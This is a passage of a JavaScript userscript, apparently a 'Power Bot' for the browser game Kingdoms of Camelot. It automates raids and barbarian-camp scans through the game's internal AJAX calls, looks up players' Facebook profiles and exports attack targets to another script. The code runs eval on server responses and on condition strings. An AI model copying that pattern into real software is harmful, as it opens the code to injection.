      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_10_50.jpg?6545"></td>'
      m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt10']) +'</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_11_50.jpg?6545"></td>'
      m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt11']) +'</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_12_50.jpg?6545"></td>'
      m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt12']) +'</td></tr>'
      m += '<TR><TD><INPUT id=Unit9 type=text size=6 maxlength=6 value="0"></td>';
      m += '<TD><INPUT id=Unit10 type=text size=6 maxlength=6 value="0"></td>';
      m += '<TD><INPUT id=Unit11 type=text size=6 maxlength=6 value="0"></td>';
      m += '<TD><INPUT id=Unit12 type=text size=6 maxlength=6 value="0"></td></tr></table>';
      
      m += '<BR><CENTER>' +strButton20(translate('Help'), 'id=pbHelp')+'<SELECT id=RaidKnights type=list></select></center>';
      m+= '<BR><CENTER>'+ strButton20(translate('Raid and save'), 'id=pbRaidSave') +'</center>';
          
    pop.getMainDiv().innerHTML = m;
    
    t.getKnights();
    
    document.getElementById ('pbHelp').addEventListener ('click', t.helpPop, false);
    document.getElementById ('pbRaidSave').addEventListener ('click', function(){
        var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
                          
        params.pf = 0;
        params.ctrl = 'BotManager';
        params.action = 'saveMarch';
        params.settings = {};
        params.settings.cityId = cityId;
        params.queue = {0:{botMarches:{botMarchStatus:1,botState:1},cityMarches:{}}};        
        params.queue[0].cityMarches.knightId = parseInt(document.getElementById ('RaidKnights').value);
        params.queue[0].cityMarches.toXCoord = X;
        params.queue[0].cityMarches.toYCoord = Y;
        params.queue[0].cityMarches.unit0Count = 0;
        params.queue[0].cityMarches.unit1Count = parseInt(document.getElementById ('Unit1').value);
        params.queue[0].cityMarches.unit2Count = parseInt(document.getElementById ('Unit2').value);
        params.queue[0].cityMarches.unit3Count = parseInt(document.getElementById ('Unit3').value);
        params.queue[0].cityMarches.unit4Count = parseInt(document.getElementById ('Unit4').value);
        params.queue[0].cityMarches.unit5Count = parseInt(document.getElementById ('Unit5').value);
        params.queue[0].cityMarches.unit6Count = parseInt(document.getElementById ('Unit6').value);
        params.queue[0].cityMarches.unit7Count = parseInt(document.getElementById ('Unit7').value);
        params.queue[0].cityMarches.unit8Count = parseInt(document.getElementById ('Unit8').value);
        params.queue[0].cityMarches.unit9Count = parseInt(document.getElementById ('Unit9').value);
        params.queue[0].cityMarches.unit10Count = parseInt(document.getElementById ('Unit10').value);
        params.queue[0].cityMarches.unit11Count = parseInt(document.getElementById ('Unit11').value);
        params.queue[0].cityMarches.unit12Count = parseInt(document.getElementById ('Unit12').value);
        
         new AjaxRequest2(unsafeWindow.g_ajaxpath + "ajax/_dispatch.php" + unsafeWindow.g_ajaxsuffix, {
                      method: "post",
                     parameters: params,
                     loading: true,
                     onSuccess: function(transport){
                        var rslt = eval("(" + transport.responseText + ")");
                          if (rslt.ok) {
                                  pop.show (false);
                                unsafeWindow.cityinfo_army();
                              setTimeout(unsafeWindow.update_seed_ajax, 250);
                         } else ('Error :' + rslt.msg);
                         
                     },
             });
        }, false);
    
    pop.show (true);
  },
  
  
  getKnights : function(){
         var t = Tabs.Search;
         var knt = new Array();
         cityId = t.selectedCity['id'];
         for (k in Seed.knights['city' + cityId]){
                 if (Seed.knights['city' + cityId][k]["knightStatus"] == 1 && Seed.leaders['city' + cityId]["resourcefulnessKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["politicsKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["combatKnightId"] != Seed.knights['city' + cityId][k]["knightId"] && Seed.leaders['city' + cityId]["intelligenceKnightId"] != Seed.knights['city' + cityId][k]["knightId"]){
                     knt.push ({
                         Name:   Seed.knights['city' + cityId][k]["knightName"],
                         Combat:    parseInt(Seed.knights['city' + cityId][k]["combat"]),
                         ID:        Seed.knights['city' + cityId][k]["knightId"],
                     });
                 }
         }
         knt = knt.sort(function sort(a,b) {a = a['Combat'];b = b['Combat'];return a == b ? 0 : (a > b ? -1 : 1);});
         document.getElementById('RaidKnights').options.length=0;
          var o = document.createElement("option");
          o.text = '--Choose a Knight--';
          o.value = 0;
          document.getElementById("RaidKnights").options.add(o);
         for (k in knt){
                  if (knt[k]["Name"] !=undefined){
                      var o = document.createElement("option");
                      o.text = (knt[k]["Name"] + ' (' + knt[k]["Combat"] +')')
                      o.value = knt[k]["ID"];
                      document.getElementById("RaidKnights").options.add(o);
                  }
          }
      },
  
  
  
  gotPlayerLeaderboard : function (rslt, span){
    var t = Tabs.Search;
    if (!rslt.ok){
      span.innerHTML = rslt.errorMsg;
      return;
    }
    if (rslt.totalResults == 0){
      span.innerHTML = '<B>'+translate("Leaderboard")+':</b> '+translate("Not found")+'! ('+translate("misted")+'?)<BR><BR>';
      return;
    }
    var p = rslt.results[0];
    var x;
    var name = '';
    if (p.playerSex == 'M')
      name = 'Lord ';
    else if (p.playerSex == 'F')
      name = 'Lady ';   
    name += p.displayName;      
    if ((x = officerId2String(p.officerType)) != '')  
      name += ' ('+ x + ')';  
    var aName = p.allianceName;
    if (!aName || aName=='')
      aName = 'none';
             
    var m = '<CENTER><SPAN class=boldRed>'+translate("NOTE: Leaderboard information is delayed up to 24 hours")+'</span></center><TABLE class=pbTabSome>';
    m += '<TR><TD class=pbDetLeft>'+translate("Player Name")+':</td><TD>'+ name +'</td></tr>\
      <TR><TD class=pbDetLeft>'+translate("Might")+':</td><TD>'+ p.might +' ('+translate("rank")+' #'+ p.rank +')</td></tr>\
      <TR><TD class=pbDetLeft>'+translate("Alliance")+':</td><TD>'+ aName +' ('+ getDiplomacy(p.allianceId) +')</td></tr>\
      <TR valign=top><TD class=pbDetLeft>'+translate("Cities")+':</td><TD><TABLE class=pbTabSome><TR style="font-weight:bold"><TD>'+translate("City Name")+'</td><TD>'+translate("Coords")+'</td><TD>'+translate("Level")+'</td><TD>'+translate("Status")+'</td><TD>'+translate("Created")+'</td></tr>';
      
    for (var i=0; i<p.cities.length; i++){
      var c = p.cities[i];
      var created = '';
      if (c.dateCreated && c.dateCreated.substr(0,2)=='20')
        created = c.dateCreated.substr(0,10);
      m += '<TR><TD>'+ c.cityName +'</td><TD>'+ coordLink(c.xCoord, c.yCoord) +'</td><TD align=center>'+ c.tileLevel +'</td>\
          <TD>'+ cityStatusString (c.cityStatus) +'</td><TD>'+ created +'</td></tr>';
    }    
    m += '</table></td></tr></table>';
    span.innerHTML = m;
  },

  gotPlayerInfo : function (rslt, span){
    var t = Tabs.Search;
    if (!rslt.ok){
      span.innerHTML = rslt.errorMsg;
      return;
    }
    var m = '<TABLE class=pbTabSome>';
    var p = rslt.userInfo[0];
    var pids = p.provinceIds.split (',');
    var prov = [];
    for (var i=0; i<pids.length; i++)
      prov.push(unsafeWindow.provincenames['p'+pids[i]]);
    m += '<TR><TD class=pbDetLeft>'+translate("Player Name")+':</td><TD>'+ p.genderAndName +'</td></tr>\
      <TR><TD class=pbDetLeft>'+translate("Might")+':</td><TD>'+ p.might +'</td></tr>\
      <TR><TD class=pbDetLeft>'+translate("Facebook profile")+':</td><TD><A target="_tab" href="http://www.facebook.com/profile.php?id='+ p.fbuid +'">'+translate("Click to open in new tab")+'</a></td></tr>\
      <TR><TD class=pbDetLeft>'+translate("Alliance")+':</td><TD>'+ p.allianceName +' ('+ getDiplomacy(p.allianceId) +')</td></tr>\
      <TR valign=top><TD class=pbDetLeft>'+translate("Provinces")+':</td><TD style="white-space:normal">'+ prov.join(', ') +'</td></tr>';
    span.innerHTML = m + '</table>';
  },
      
  fetchPlayerInfo : function (uid, notify){
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.uid = uid;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getUserGeneralInfo.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onSuccess: function (rslt) {
        notify (rslt);
      },
    });
  },
  fetchLeaderboard : function (uid, notify) {
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.userId = uid;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getUserLeaderboard.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify (rslt);
      },
    });
  },
  fetchPlayerStatus : function (uidArray, notify){
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.checkArr = uidArray.join(',');
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getOnline.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify ({errorMsg:'AJAX error'});
      },
    });
  },
  
};   // end Search tab




/******** Export to KOC Attack **********/  

var exportToKOCattack = {
  troops : {},  
  
  init : function (){
    var t = exportToKOCattack;
    for (var b=1; b<11; b++){
      t.troops['b'+ b] = [];
      for (var trp=0; trp<12; trp++){
        t.troops['b'+ b][trp] = 0;
      }
    }
    var s = GM_getValue ('atkTroops_'+ getServerId(), null);
    if (s != null){
      var trp = JSON2.parse(s);
      for (var b=1; b<11; b++){
        if (trp['b'+ b] && trp['b'+ b].length == 12)
          t.troops['b'+ b] = trp['b'+ b];
      }
    }
    window.addEventListener('unload', t.onUnload, false);
  },
  
  onUnload : function (){
    var t = exportToKOCattack;
    if (!ResetAll) GM_setValue ('atkTroops_'+ getServerId(),  JSON2.stringify(t.troops));
  },
  
  doExport : function (coordList, city){
    var t = exportToKOCattack;
    var popExp = null;
    var cList = coordList;
    var curLevel = 0;
    var city = city;
    var troopDef = [
      ['STroop', 1],
      ['Wagon', 9],
      ['Archers', 6],
      ['Cavalry', 7],
      ['Heavies', 8],
      ['Ballista', 10],
    ];
    
    if (popExp == null){
      popExp = new pbPopup ('pbsrcexp', 0,0, 625,600, true, function (){popExp.destroy(); popExp=null;});
      popExp.centerMe (mainPop.getMainDiv());  
    }
    var m = '<DIV class=pbStat>Export data to KOC Attack</div><BR><TABLE align=center cellpadding=0 cellspacing=0 class=pbTabPadNW>\
      <TR style="font-weight:bold; background-color:white"><TD>Target Type</td><TD style="padding:1px" align=center>#<BR>targets</td><TD width=15></td>';
    for (var i=0; i<troopDef.length; i++)
      m += '<TD>'+ troopDef[i][0] +'</td>';
    m += '</tr>';
    for (var b=1; b<11; b++){
      m += '<TR><TD>Barb level '+ b +'</td><TD align=right>'+ coordList['lvl'+b].length  +'&nbsp; &nbsp;</td><TD></td>';
      for (var td=0; td<troopDef.length; td++)
        m += '<TD><INPUT id=ptET_'+ b +'_'+ troopDef[td][1] +' type=text size=3 value="'+ t.troops['b'+ b][troopDef[td][1]-1] +'"></td>';
      m += '<TD width=90%><SPAN class=boldRed id=ptETerr_'+ b +'></span></tr>';
    }
    m += '</table>';
    var isKOCattack = !(document.getElementById('KOCAttackToggle') == null);
    
    //TODO: 'RESET VALUES' button ?
    
    if (isKOCattack){
      m += '<BR><CENTER>'+ strButton20('Bulk Add to KOC Attack', 'id=pbSrcDoBA') +'</center>';
    } else {
      m += 'KOC Attack not running, unable to export';
    }
    m += '<CENTER><DIV style="width:70%" id=pbSrcExpResult></DIV></center>';
    popExp.getMainDiv().innerHTML =  m;
    for (var b=1; b<11; b++)
      for (var td=0; td<troopDef.length; td++)
        document.getElementById('ptET_'+ b +'_'+ troopDef[td][1]).addEventListener ('change', validate, false);
    
    popExp.getTopDiv().innerHTML = '<CENTER><B>Power Bot Export</b></center>';
    if (isKOCattack)    
      document.getElementById ('pbSrcDoBA').addEventListener ('click', doBulkAdd, false);
    popExp.show(true);
         
    if (city != null){
      for (var i=0; i<Cities.numCities; i++)
        if (city.id == Cities.cities[i].id)
          break;
      if (i < Cities.numCities){
        setTimeout (function(){unsafeWindow.citysel_click(document.getElementById('citysel_'+ (i+1)));}, 0);
//logit ("SWITCH CITY: "+ (i+1));          
      }
    }
// TODO: WAIT FOR City select ?
    
  
    function validate (e){
      var x = e.target.id.substr(5).split('_');
      var b = x[0];
      var trp = x[1];
      document.getElementById('ptETerr_'+ b).innerHTML = '';
      var x = parseIntZero (e.target.value);
      if (isNaN(x) || x<0 || x>150000){
        e.target.style.backgroundColor = 'red';
        document.getElementById('ptETerr_'+ b).innerHTML = 'Invalid Entry';
        return;
      } else {
        e.target.style.backgroundColor = '';
        e.target.value = x;
        t.troops['b'+ b][trp-1] = x;
      }
      var tot = 0;
      for (var td=0; td<troopDef.length; td++)
        tot += parseIntZero(document.getElementById('ptET_'+ b +'_'+ [troopDef[td][1]]).value);
      if (tot<1 && cList['lvl'+ b].length>0 )
        document.getElementById('ptETerr_'+ b).innerHTML = 'No troops defined';
      if (tot>150000)
        document.getElementById('ptETerr_'+ b).innerHTML = 'Too many troops';
    }
      
    function doBulkAdd (){
      for (var b=1; b<11; b++){
        if (document.getElementById('ptETerr_'+ b).innerHTML != '')
          return;
        var tot = 0;
        for (var td=0; td<troopDef.length; td++)
          tot += t.troops['b'+b][troopDef[td][1]-1];
        if (tot<1 && cList['lvl'+ b].length>0){
          document.getElementById('ptETerr_'+ b).innerHTML = 'No troops defined';
          return;
        } else if (tot>150000) {
          document.getElementById('ptETerr_'+ b).innerHTML = 'Too many troops';
          return;
        }
      }    
      document.getElementById('pbSrcExpResult').innerHTML = '';
      doNextLevel ();
    }
    
    function endBulkAdd (msg){
      unsafeWindow.Modal.hideModalAll();
      curLevel = 0;
      showMe ();
      popExp.show(true);
      document.getElementById('pbSrcExpResult').innerHTML += msg;
    }
    
    function doNextLevel (){
      while ( curLevel<10 && cList['lvl'+ ++curLevel].length==0)
        ;
      if (curLevel>=10){
        endBulkAdd ('Done!<BR>');
        return;
      }
     e_attackDialog(false);
    }
        
    function e_attackDialog (tf){
      if (!tf){
       hideMe();
       popExp.show (false);
       unsafeWindow.Modal.hideModalAll();
       unsafeWindow.modal_attack(4,0,0);
       new CwaitForElement ('BulkAddAttackDiv', 1000, e_attackDialog );
      }
      var div = searchDOM (document.getElementById('BulkAddAttackDiv'), 'node.tagName=="DIV" && node.style.display=="none"', 10);
      if (div==null){
        endBulkAdd ('<SPAN class=boldRed>ERROR: Unexpected attack dialog format (1).</span>');
        return;  
      }
      var ta = searchDOM (div, 'node.tagName=="TEXTAREA"', 10);
      var but = searchDOM (div, 'node.tagName=="A"', 10);
      if (ta==null || but==null){
        endBulkAdd ('<SPAN class=boldRed>ERROR: Unexpected attack dialog format (2).</span>');
        return;  
      }
      for (var trp=1; trp<13; trp++){
        var inp = document.getElementById('modal_attack_unit_ipt' +trp);
        inp.value = t.troops['b'+curLevel][trp-1];
        if (t.troops['b'+curLevel][trp-1] > 0)
          inp.style.backgroundColor = 'yellow';
        else
          inp.style.backgroundColor = 'white';
      }
      div.style.display = 'block';
      document.getElementById('KOCAttackBulkAddForce').checked = true;
      if (DISABLE_BULKADD_LIST)
        ta.value = '';
      else {
        var m = '';
        var list = cList['lvl'+ (curLevel)];
        for (i=0; i<list.length; i++)
          m += list[i].x +','+ list[i].y +'\n';
        ta.value = m;
      }
      clickWin (unsafeWindow, but, 'click');   
      unsafeWindow.Modal.hideModal();
      document.getElementById('pbSrcExpResult').innerHTML += 'Added '+ list.length +' targets for '+ city.name +'<BR>';
      setTimeout (doNextLevel, 500);
    }    
  },
}


  function searchDOM (node, condition, maxLevel, doMult){
    var found = [];
    eval ('var compFunc = function (node) { return ('+ condition +') }');
    doOne(node, 1);
    if(!doMult){
      if (found.length==0)
        return null;
      return found[0];
    }
    return found;
    function doOne (node, curLevel){
      try {
        if (compFunc(node))
          found.push(node);
      } catch (e){
      }      
      if (!doMult && found.length>0)
        return;
      if (++curLevel<maxLevel && node.childNodes!=undefined)
        for (var c=0; c<node.childNodes.length; c++)
          doOne (node.childNodes[c], curLevel);
    }
  }



/****************************  Sample Tab Implementation  ******************************/
Tabs.sample = {
  tabOrder : 300,                    // order to place tab in top bar
  tabLabel : 'Laboratoire',            // label to show in main window tabs
  myDiv : null,
  timer : null,  
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.sample;
    t.myDiv = div;
    var cityName = Cities.cities[0].name;
    div.innerHTML = '<CENTER>En cours de construction</center>';
  },
  
  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.sample;
    clearTimeout (t.timer);
  },
  
  show : function (){         // called whenever this tab is shown
    var t = Tabs.sample;
    var food = parseInt(Seed.resources['city'+ Cities.cities[0].id]['rec'+1][0] / 3600);
    document.getElementById('pbSampleFood').innerHTML = addCommas (food);
    clearTimeout (t.timer);
    t.timer = setTimeout (t.show, 5000);
  },
}


/*********************************** ATTACK TAB ***********************************/
function setMaxHeightScrollable (e){
  e.style.height = '100%';
  e.style.height = e.clientHeight + 'px';
  //e.style.maxHeight = e.clientHeight + 'px';
  e.style.overflowY = 'auto';
}

Tabs.Attack = {
  tabDisabled : !ENABLE_ATTACK_TAB,
  tabOrder: 500,
  myDiv : null,
  data : {},  
  MapAjax : new CMapAjax(),
    
  init : function (div){
    var t = Tabs.Attack;
    t.myDiv = div;
    t.myDiv.innerHTML = '<TABLE width=100% height=100% class=pbTab><TR><TD><INPUT id=pbBarbShow type=submit value="Show All Targets" \> <BR>\
       City: <SPAN id=pbAtkCSS></span> &nbsp; &nbsp; &nbsp; Radius: <INPUT id=pbBarbDist size=3 type=text> &nbsp; &nbsp; <INPUT id=pbBarbScan type=submit value=Scan \></td></tr><TR><TD height=100%>\
       <DIV id=pbAtkDiv style="background-color:white"></div></td></tr></table>';
    t.loadTargets ();
    // TODO: Check current cities, invalidate data if city moved
    document.getElementById('pbBarbScan').addEventListener ('click', t.e_clickedScan, false);
    document.getElementById('pbBarbShow').addEventListener ('click', t.e_clickedShow, false);
    new CdispCityPicker ('pbAtkCS', document.getElementById('pbAtkCSS'), false, function (c){t.scanCity=c}, 0);
  },
  
  hide : function (){
  },

  state : 0,
  show : function (){
    var t = Tabs.Attack;
    if (t.state == 0){
      setMaxHeightScrollable (document.getElementById('pbAtkDiv'));
      t.state = 1;
    }
  },

  clearDiv : function (){
    document.getElementById('pbAtkDiv').innerHTML = '';
  },
  writeDiv : function (m){
    document.getElementById('pbAtkDiv').innerHTML += m;
  },
  
  loadTargets : function (){
    var t = Tabs.Attack;
DebugTimer.start();
    var totTargets = 0;   
    for (var c=0; c<Cities.numCities; c++){
      var s = GM_getValue ('atk_'+ getServerId() +'_'+ Cities.cities[c].id, null);
      if (s == null)
        t.data['city'+ Cities.cities[c].id] = {cityX:Cities.cities[c].x, cityY:Cities.cities[c].y, radius:0, numTargets:0, targets:{}};
      else
        t.data['city'+ Cities.cities[c].id] = JSON2.parse (s);
      totTargets += t.data['city'+ Cities.cities[c].id].numTargets;
    }
DebugTimer.display ('Time to GM_getValue() '+ totTargets +' targets for all cities');    
  },
  
  e_clickedScan : function (){
    var t = Tabs.Attack;
    t.clearDiv();
    var dist = parseInt(document.getElementById('pbBarbDist').value);
    if (isNaN(dist) || dist<1 || dist>35){
      t.writeDiv ("<SPAN class=boldRed>Nuh-uh, try again</span><BR>");
      return;
    }
    t.writeDiv ('Scanning map for city: '+ t.scanCity.name +'<BR>');
    t.scanBarbs (t.scanCity.id, dist);
  },

  popShow : null,  
  
  e_clickedShow : function (){    // show all current attack data
    var t = Tabs.Attack;
    if (t.popShow == null){
      t.popShow = new pbPopup ('pbbs', 0,0, 500,500, true, function (){t.popShow.destroy(); t.popShow=null;});
      t.popShow.centerMe (mainPop.getMainDiv());  
    }
    var m = '<DIV style="max-height:460px; height:460px; overflow-y:auto"><TABLE align=center cellpadding=0 cellspacing=0 class=pbTabPad>';
    for (var c=0; c<Cities.numCities; c++){
      var dat = t.data['city'+ Cities.cities[c].id];
      m += '<TR><TD colspan=3><DIV class=pbStat>'+ Cities.cities[c].name +' &nbsp; (radius:'+ dat.radius +' &nbsp;targets:'+ dat.numTargets  +')</div></td></tr>';
      // sort by distance ...
      var atks = [];
      for (k in dat.targets)
        atks.push (dat.targets[k]);
      atks.sort (function(a,b){return a.dist-b.dist});     
      for (i=0; i<atks.length; i++)
        m += '<TR><TD>Barb Camp '+ atks[i].lvl +'</td><TD>'+ atks[i].x +','+ atks[i].y +'</td><TD> &nbsp; Dist='+ atks[i].dist.toFixed(2) +'</td></tr>';
    }    
    t.popShow.getMainDiv().innerHTML = '</table></div>'+ m;
    t.popShow.getTopDiv().innerHTML = '<CENTER><B>Showing all targets in memory</b></center>';
    t.popShow.show(true);    
  },

  configWriteTargets : function (cityID){
    var t = Tabs.Attack;
    var serverID = getServerId();
    DebugTimer.start();    
    GM_setValue ('atk_'+ serverID +'_'+ cityID,  JSON2.stringify(t.data['city'+ cityID]));
    t.writeDiv ('** Time to GM_setValue() '+ t.data['city'+ cityID].numTargets +' targets for city: '+ (DebugTimer.getMillis()/1000) +' seconds<BR>');
  },
    
  oScan : {},   
  scanBarbs : function (cityID, distance){   // max distance:35
    var t = Tabs.Attack;
    var city = Cities.byID[cityID];
// TODO: remember state - in case of refresh
    var x = t.MapAjax.normalize(city.x-distance);
    var y = t.MapAjax.normalize(city.y-distance);
    t.oScan = { city:city, centerX:city.x, centerY:city.y, maxDist:distance,
        minX:x, maxX:city.x+distance, minY:y, maxY:city.y+distance, curX:x, curY:y, data:[] };
    setTimeout (function(){t.MapAjax.request (t.oScan.curX, t.oScan.curY, 15, t.e_mapCallback)}, MAP_DELAY);
    t.writeDiv ('Scanning @ '+ t.oScan.curX +','+ t.oScan.curY +'<BR>');
  },

  e_scanDone : function (errMsg){
    var t = Tabs.Attack;
    t.data['city'+ t.oScan.city.id] = {cityX:t.oScan.city.x, cityY:t.oScan.city.y, radius:t.oScan.maxDist, numTargets:0, targets:{}};
    var dat = t.data['city'+ t.oScan.city.id];
    t.writeDiv ('Done scanning<BR>');
    for (var i=0; i<t.oScan.data.length; i++){
      var map = t.oScan.data[i];
      dat.targets[map[0] +'_'+ map[1]] = {type:'b', x:map[0], y:map[1], dist:map[2], lvl:map[3]};
      ++dat.numTargets;
    }
    t.configWriteTargets (t.oScan.city.id);
  },
      
  e_mapCallback : function (left, top, width, rslt){
    var t = Tabs.Attack;
    if (!rslt.ok){
      setTimeout (function(){t.e_scanDone (rslt.errorMsg)}, 0);
      t.writeDIV ('<BR>ERROR: '+ rslt.errorMsg +'<BR>');
      return;
    }
    var map = rslt.data;
    for (k in map){
      var lvl = parseInt(map[k].tileLevel);
      if (map[k].tileType==51 && !map[k].tileCityId && lvl<8) {  // if barb
        var dist = distance (t.oScan.centerX, t.oScan.centerY, map[k].xCoord, map[k].yCoord);
        if (dist <= t.oScan.maxDist){
          t.oScan.data.push ([parseInt(map[k].xCoord), parseInt(map[k].yCoord), dist, lvl]);
        }
      }
    }
    t.oScan.curX += 15;
    if (t.oScan.curX > t.oScan.maxX){
      t.oScan.curX = t.oScan.minX;
      t.oScan.curY += 15;
      if (t.oScan.curY > t.oScan.maxY){
        setTimeout (function(){t.e_scanDone (null)}, 0);
        return;
      }
    }
    var x = t.oScan.curX;
    var y = t.oScan.curY;
    setTimeout (function(){t.MapAjax.request (x,y, 15, t.e_mapCallback)}, MAP_DELAY);
    t.writeDiv ('Scanning @ '+ x +','+ y +'<BR>');
  },
}


/*********************************** Log Tab ***********************************/
Tabs.ActionLog = {
  tabOrder: 130,
  tabLabel : 'Log',
  myDiv : null,
  logTab : null,
  maxEntries: 300,
  last50 : [],
  state : null,
    
  init : function (div){
    var t = Tabs.ActionLog;
    t.myDiv = div;
    t.myDiv.innerHTML = '<DIV class=pbStat>ACTION LOG - VERSION: '+ Version+'</div><DIV style="height:535px; max-height:535px; overflow-y:auto">\
      <TABLE cellpadding=0 cellspacing=0 id=pbactionlog class=pbTabLined><TR><TD></td><TD width=95%></td></table></div>';
    t.logTab = document.getElementById('pbactionlog');  
    t.state = 1;
    var a = JSON2.parse(GM_getValue ('log_'+getServerId(), '[]'));
    if (matTypeof(a) == 'array'){
      t.last50 = a;
      for (var i=0; i<t.last50.length; i++)
        t._addTab (t.last50[i].msg, t.last50[i].ts);
    }
    window.addEventListener('unload', t.onUnload, false);
  },

  hide : function (){
  },

  show : function (){
  },

  onUnload : function (){
    var t = Tabs.ActionLog;
    if (!ResetAll) GM_setValue ('log_'+getServerId(), JSON2.stringify(t.last50));
  },
    
  _addTab : function (msg, ts){
    var t = Tabs.ActionLog;
    if (t.state != 1)
      return;
    if (t.logTab.rows.length >= t.maxEntries)
      t.logTab.deleteRow(t.maxEntries-1);
    var row = t.logTab.insertRow(0);
    row.vAlign = 'top';
    row.insertCell(0).innerHTML = ts;
    row.insertCell(1).innerHTML = msg;
  },
  
  log : function (msg){
    var t = Tabs.ActionLog;
    var ts = new Date().toTimeString().substring (0,8);
    t._addTab (msg, ts);
    while (t.last50.length >= 50)
      t.last50.shift();
    t.last50.push ({msg:msg, ts:ts});
  },
}

function actionLog (msg){
  if (!Tabs.ActionLog.tabDisabled)
    Tabs.ActionLog.log (msg);  
}
    

/*********************************** Options Tab ***********************************/
Tabs.Options = {
  tabOrder: 699,
    tabDisabled : !ENABLE_SAMPLE_TAB,
  myDiv : null,
  fixAvailable : {},

  init : function (div){
    var t = Tabs.Options;
    t.myDiv = div;
    try {      
      m = '<DIV style="height:500px; max-height:500px; overflow-y:auto"><TABLE width=100% class=pbOptions cellspacing=0 cellpadding=0>\
        <TR><TD colspan=2><B>'+translate("Power Bot Config:")+'</b></td></tr>\
        <TR><TD><INPUT id=pballowWinMove type=checkbox /></td><TD>'+translate("Enable window drag (move window by dragging top bar with mouse)")+'</td></tr>\
        <TR><TD><INPUT id=pbTrackWinOpen type=checkbox /></td><TD>'+translate("Remember window open state on refresh")+'</td></tr>\
        <TR><TD><INPUT id=pbHideOnGoto type=checkbox /></td><TD>'+translate("Hide window when clicking on map coordinates")+'</td></tr>\
        <TR><TD><INPUT id=pbWideOpt type=checkbox '+ (GlobalOptions.pbWideScreen?'CHECKED ':'') +'/></td><TD>'+translate("Enable widescreen style:")+' '+ htmlSelector({normal:'Normal', wide:'Widescreen', ultra:'Ultra'},GlobalOptions.pbWideScreenStyle,'id=selectScreenMode') +' '+translate("(all domains, requires refresh)")+'</td></tr>\
        <TR><TD><INPUT id=pbsendmeaway type=checkbox '+ (GlobalOptions.pbNoMoreKabam?'CHECKED ':'')+'/></td><TD>'+translate("Send me away from Kabam!")+'</td></tr>\
        <TR><TD><INPUT id=pbupdate type=checkbox '+ (GlobalOptions.pbupdate?'CHECKED ':'') +'/></td><TD>'+translate("Check updates on")+' '+ htmlSelector({0:'Userscripts', 1:'Google Code'},GlobalOptions.pbupdatebeta,'id=pbupdatebeta') +' '+translate("(all domains)")+' &nbsp; &nbsp; <INPUT id=pbupdatenow type=submit value="'+translate("Update Now")+'" /></td></tr>\
        <TR><TD>&nbsp;&nbsp;&nbsp;-</td><TD>'+translate("Change window transparency between \"0.7 - 2\" ")+'&nbsp <INPUT id=pbtogOpacity type=text size=3 /> <span style="color:#800; font-weight:bold"><sup>'+translate("*Requires Refresh")+'</sup></span></td></tr>\
        <TR><TD colspan=2><BR><B>'+translate("KofC Features:")+'</b></td></tr>\
        <TR><TD><INPUT id=pbFairie type=checkbox /></td><TD>'+translate("Disable annoying Faire and Court popups")+'</td></tr>\
        <TR><TD><INPUT id=pbWatchEnable type=checkbox '+ (GlobalOptions.pbWatchdog?'CHECKED ':'') +'/></td><TD>'+translate("Refresh if KOC not loaded within 1 minute (all domains)")+'</td></tr>\
        <TR><TD><INPUT id=pbEveryEnable type=checkbox /></td><TD>'+translate("Refresh KOC every")+' <INPUT id=pbeverymins type=text size=2 maxlength=3 \> '+translate("minutes")+'</td></tr>\
        <TR><TD><INPUT id=pbChatREnable type=checkbox /></td><TD>'+translate("Put chat on right (requires wide screen)")+'</td></tr>\
        <TR><TD><INPUT id=pbWMapEnable type=checkbox /></td><TD>'+translate("Use WideMap (requires wide screen)")+'</td></tr>\
        <TR><TD><INPUT id=pbGoldEnable type=checkbox /></td><TD>'+translate("Auto collect gold when happiness reaches")+' <INPUT id=pbgoldLimit type=text size=2 maxlength=3 \>%</td></tr>\
        <TR><TD><INPUT id=pbFoodToggle type=checkbox /></td><TD>'+translate("Enable Food Alert (on less than 6 Hours of food. Checked every hour)")+'</td></tr>';
        m += '<TR><TD><INPUT id=pbmaintoggle type=checkbox /></td><TD>'+translate("auto select city on startup");
         m+='<select id=pbwhichcity>';
         for(h =0;h < unsafeWindow.seed.cities.length;h++) {
			 if(h == Options.smain) 
			 m+='<option value='+h+' selected="selected">'+unsafeWindow.seed.cities[h][1]+'</option>';
			 else
			 m+='<option value='+h+'>'+unsafeWindow.seed.cities[h][1]+'</option>';
		 }
		m+='</select>'+'</td></tr>';

        m += '<TR><TD colspan=2><BR><B>'+translate("Extra Features")+':</b></td></tr>\
        <TR><TD><INPUT id=HelReq type=checkbox /></td><TD>'+translate("Help alliance build/research posts")+'</td></tr>\
        <TR><TD><INPUT id=DelReq type=checkbox /></td><TD>'+translate("Hide alliance requests in chat")+'</td></tr>\
        <TR><TD><INPUT id=DelAC type=checkbox /></td><TD>'+translate("Hide alliance chat from global chat")+'</td></tr>\
